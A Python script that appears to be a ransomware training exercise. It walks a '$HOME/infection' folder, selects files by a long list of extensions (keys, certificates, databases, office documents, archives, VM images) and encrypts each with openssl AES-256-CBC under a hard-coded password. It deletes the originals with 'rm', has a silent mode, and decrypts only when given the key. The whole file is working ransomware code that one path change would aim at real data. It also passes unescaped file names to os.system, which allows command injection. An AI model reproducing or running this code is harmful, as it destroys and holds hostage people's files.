import os
import sys
from argparse import ArgumentParser
from os import scandir, getcwd
from os.path import abspath

ft = ('.ft')
extensions = ('.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc')

dir_s = []
files = []
code = "1234123412341234"

dir = os.environ['HOME']
dir += '/infection'

def main():
    parser = ArgumentParser()
    parser.add_argument("-reverse", type=str, nargs=1, help="desencrypt passw")
    parser.add_argument("-v", action='store_true', help="show version")
    parser.add_argument("-silent", action='store_true', help="silent mode")
    args = parser.parse_args()
    if args.reverse:
        desencrypt(False, ft, str(args.reverse))
    elif args.silent:
        encrypt(True, extensions)
    elif args.v:
        print("Version 0.1")
    else:
        encrypt(False, extensions)

#Function to encrypt
def encrypt(silent, exten):
    for elem in os.walk(dir):
        dir_s.append(elem[0])
    for sub_d in dir_s:
        ls(exten, sub_d)
    for obj in files:
        command = str("openssl aes-256-cbc -in " + obj + 
                " -pass pass:" + code + " -out " + obj + ".ft")
        os.system(command)
        if silent == False:
            print (command)
        command = str("rm " + obj)
        os.system(command)
        if silent == False:
            print (command)

#Function to desencrypt
def desencrypt(silent, exten, passw):
    if passw[2:-2] != code:
        print("[🚨]Incorrect code", file=sys.stderr)
        quit(1)
    for elem in os.walk(dir):
        dir_s.append(elem[0])
    for sub_d in dir_s:
        ls(exten, sub_d)
    for obj in files:
        command = str("openssl aes-256-cbc -d -in " 
                + obj + " -pass pass:" + passw[2:-2] + " -out " + obj[:-3])
        os.system(command)
        if silent == False:
            print (command)
        command = str("rm " + obj)
        os.system(command)
        if silent == False:
            print (command)

def ls(exten, ruta = getcwd()):
    aux = [abspath(arch.path) for arch in scandir(ruta) if arch.is_file()]
    for a in aux:
        a = str(a)
        if os.path.splitext(a)[1] in exten:
            files.append(a)

if __name__ == '__main__':
    if not os.path.exists(dir):
        print("[🚨] Folder /infection not found!!!", file=sys.stderr)
        quit(1)
    main()

